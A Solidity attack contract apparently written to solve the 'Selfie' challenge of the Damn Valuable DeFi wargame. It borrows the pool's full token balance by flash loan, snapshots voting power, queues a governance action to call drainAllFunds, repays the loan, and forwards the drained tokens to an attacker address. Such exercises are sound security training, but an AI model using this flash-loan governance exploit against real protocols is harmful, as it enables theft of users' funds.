pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract SelfieAttack {
    SelfiePool public selfiePool;
    address attacker;
    DamnValuableTokenSnapshot public dvt;
    SimpleGovernance public governance;
    uint256 public actionId;

    constructor(
        address selfiePoolAddress,
        address attackerAddress,
        address tokenAddress,
        address governanceAddress
    ) {
        selfiePool = SelfiePool(selfiePoolAddress);
        attacker = attackerAddress;
        dvt = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function attack() public {
        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {

        uint256 snapshotId = dvt.snapshot();
        console.log(
            "Snapshot id: %s",
            snapshotId,
            dvt.getBalanceAtLastSnapshot(address(this))
        );

        actionId = governance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
            0
        );

        //         DamnValuableToken token = DamnValuableToken(tokenAddress);

        dvt.transfer(address(selfiePool), amount);
        console.log("Returned  tokens %s.", dvt.balanceOf(address(this)));
    }

    function transferToAttacker() public {
        console.log("current ballance %s",dvt.balanceOf(address(this)));
        dvt.transfer(attacker, dvt.balanceOf(address(this)));

    }

    

    receive() external payable {}
}
